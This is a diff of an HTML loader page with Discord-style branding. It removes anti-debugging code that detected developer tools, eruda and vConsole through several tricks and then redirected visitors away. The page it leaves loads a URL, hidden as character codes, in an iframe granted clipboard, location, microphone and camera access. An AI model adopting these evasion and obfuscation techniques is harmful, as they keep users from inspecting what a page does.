@@ -76,11 +76,7 @@
         .pill:nth-child(2) .pill-dot{background:var(--green);box-shadow:0 0 6px rgba(87,242,135,.4)}
         .pill:nth-child(3) .pill-dot{background:var(--fuchsia);box-shadow:0 0 6px var(--fuchsia-glow)}
         .pill:nth-child(4) .pill-dot{background:var(--yellow);box-shadow:0 0 6px rgba(254,231,92,.4)}
-        #bait-screen{position:fixed;inset:0;background:#000;color:#fff;display:flex;flex-direction:column;align-items:center;justify-content:center;z-index:9999;font-family:'Segoe UI',system-ui,sans-serif;opacity:0;pointer-events:none;transition:opacity .4s cubic-bezier(.16,1,.3,1)}
-        #bait-screen.active{opacity:1;pointer-events:all}
-        #bait-screen h1{font-size:48px;font-weight:300;margin-bottom:0;text-align:center;padding:0 20px;letter-spacing:6px;text-transform:uppercase;opacity:0;transform:translateY(20px);animation:baitSlideUp .8s cubic-bezier(.16,1,.3,1) forwards}
-        @keyframes baitSlideUp{0%{opacity:0;transform:translateY(20px)}100%{opacity:1;transform:translateY(0)}}
-        @media(max-width:480px){.title{font-size:24px}.logo-wrapper{width:88px;height:88px}.logo-inner{width:88px;height:88px;border-radius:24px}.clyde-svg{width:48px;height:48px}.pill{font-size:10px;padding:4px 10px}#loader{gap:26px}#bait-screen h1{font-size:32px;letter-spacing:3px}}
+        @media(max-width:480px){.title{font-size:24px}.logo-wrapper{width:88px;height:88px}.logo-inner{width:88px;height:88px;border-radius:24px}.clyde-svg{width:48px;height:48px}.pill{font-size:10px;padding:4px 10px}#loader{gap:26px}}
         @media(prefers-reduced-motion:reduce){*,*::before,*::after{animation-duration:.01ms!important;transition-duration:.01ms!important}}
     </style>
 </head>
@@ -94,9 +90,6 @@
     <div class="orb orb-3"></div>
     <div class="orb orb-4"></div>
     <iframe id="content-frame" src="about:blank" allow="clipboard-read; clipboard-write; geolocation; microphone; camera"></iframe>
-    <div id="bait-screen">
-        <h1>Chào Mừng Bạn</h1>
-    </div>
     <div id="loader">
         <div class="logo-wrapper">
             <div class="logo-ring"></div>
@@ -127,101 +120,6 @@
     (function(){
         var _0x=[104,116,116,112,115,58,47,47,100,105,115,99,111,114,100,113,117,101,115,116,97,117,116,111,46,115,112,97,99,101,45,122,46,97,105,47];
         var target=_0x.map(function(c){return String.fromCharCode(c)}).join('');
-        var _isKilled=false;
-        var _kill=function(){
-            if(_isKilled)return;
-            _isKilled=true;
-            try{document.getElementById('content-frame').src='about:blank';}catch(e){}
-            try{window.stop();}catch(e){}
-            try{document.getElementById('loader').style.display='none';}catch(e){}
-            try{document.getElementById('bait-screen').classList.add('active');}catch(e){}
-            setTimeout(function(){
-                try{window.location.replace('https://www.youtube.com/@TenretniAifam');}catch(e){window.location.href='https://www.youtube.com/@TenretniAifam';}
-            },1500);
-        };
-
-        /* ===== Chống eruda / vConsole inject ===== */
-        try{
-            if(window.eruda)window.eruda=undefined;
-            Object.defineProperty(window,'eruda',{get:function(){_kill();return undefined;},set:function(){_kill();},configurable:false});
-        }catch(e){}
-        try{
-            if(window.vConsole)window.vConsole=undefined;
-            Object.defineProperty(window,'vConsole',{get:function(){_kill();return undefined;},set:function(){_kill();},configurable:false});
-        }catch(e){}
-        try{
-            var observer=new MutationObserver(function(mutations){
-                mutations.forEach(function(m){
-                    m.addedNodes.forEach(function(node){
-                        if(node.tagName==='SCRIPT'){
-                            var src=node.src||'';var txt=node.textContent||'';
-                            if(src.indexOf('eruda')!==-1||src.indexOf('vconsole')!==-1||txt.indexOf('eruda')!==-1||txt.indexOf('vConsole')!==-1||txt.indexOf('devtools')!==-1){
-                                node.remove();_kill();
-                            }
-                        }
-                        if(node.tagName==='DIV'&&(node.id==='eruda'||node.className.indexOf('eruda')!==-1||node.id==='__vconsole')){
-                            node.remove();_kill();
-                        }
-                    });
-                });
-            });
-            observer.observe(document.documentElement,{childList:true,subtree:true});
-        }catch(e){}
-        try{
-            var _origSetTimeout=window.setTimeout;
-            window.setTimeout=function(fn,delay){
-                var fnStr=(typeof fn==='function'?fn.toString():String(fn));
-                if(fnStr.indexOf('eruda')!==-1||fnStr.indexOf('vConsole')!==-1||fnStr.indexOf('devtools')!==-1){_kill();return;}
-                return _origSetTimeout.apply(this,arguments);
-            };
-        }catch(e){}
-
-        /* ===== Phương pháp 1: debugger timing (phát hiện remote debugging trên mobile) ===== */
-        var _dbgThreshold=100;
-        var _dbgCheck=function(){
-            if(_isKilled)return;
-            var _t=performance.now();
-            (function(){}).constructor('debugger')();
-            if(performance.now()-_t>_dbgThreshold)_kill();
-        };
-        _dbgCheck();
-        setInterval(_dbgCheck,800);
-
-        /* ===== Phương pháp 2: console getter trap (khi DevTools inspect object đã log) ===== */
-        var _trapEl=document.createElement('div');
-        Object.defineProperty(_trapEl,'id',{get:function(){_kill();return '';}});
-        var _trapImg=new Image();
-        Object.defineProperty(_trapImg,'src',{get:function(){_kill();return '';}});
-        var _trapLog=function(){
-            if(_isKilled)return;
-            console.log(_trapEl);
-            console.log(_trapImg);
-            console.clear();
-        };
-        _trapLog();
-        setInterval(_trapLog,1500);
-
-        /* ===== Phương pháp 3: window dimension diff (bonus cho desktop) ===== */
-        var _dimTh=160;
-        var _dimCheck=function(){
-            if(_isKilled)return;
-            var _dw=window.outerWidth-window.innerWidth;
-            var _dh=window.outerHeight-window.innerHeight;
-            if(_dw>_dimTh||_dh>_dimTh)_kill();
-        };
-        _dimCheck();
-        setInterval(_dimCheck,1000);
-
-        /* ===== Phương pháp 4: performance observer - phát hiện debug pause dài ===== */
-        try{
-            var _longTaskObs=new PerformanceObserver(function(list){
-                if(_isKilled)return;
-                list.getEntries().forEach(function(entry){
-                    if(entry.duration>200)_kill();
-                });
-            });
-            _longTaskObs.observe({entryTypes:['longtask']});
-        }catch(e){}
 
         /* ===== Particle system ===== */
         var cv=document.getElementById('particleCanvas');
@@ -263,7 +161,7 @@
             }}
         }
         function loop(){
-            if(_isKilled)return;cx.clearRect(0,0,cv.width,cv.height);
+            cx.clearRect(0,0,cv.width,cv.height);
             for(var i=0;i<ps.length;i++){ps[i].update();ps[i].draw()}lines();requestAnimationFrame(loop);
         }
         loop();
@@ -273,7 +171,7 @@
         var si=0;
         function cycle(){
             var el=document.getElementById('statusText');
-            if(!_isKilled&&si<msgs.length){el.innerHTML=msgs[si++]+'<span class="dot">.</span><span class="dot">.</span><span class="dot">.</span>';setTimeout(cycle,600);}
+            if(si<msgs.length){el.innerHTML=msgs[si++]+'<span class="dot">.</span><span class="dot">.</span><span class="dot">.</span>';setTimeout(cycle,600);}
         }
         addEventListener('DOMContentLoaded',function(){
             cycle();
@@ -282,7 +180,6 @@
             frame.src=target;
             frame.onload=function(){
                 setTimeout(function(){
-                    if(_isKilled)return;
                     loader.classList.add('fade-out');
                     frame.style.display='block';
                     requestAnimationFrame(function(){frame.classList.add('visible')});
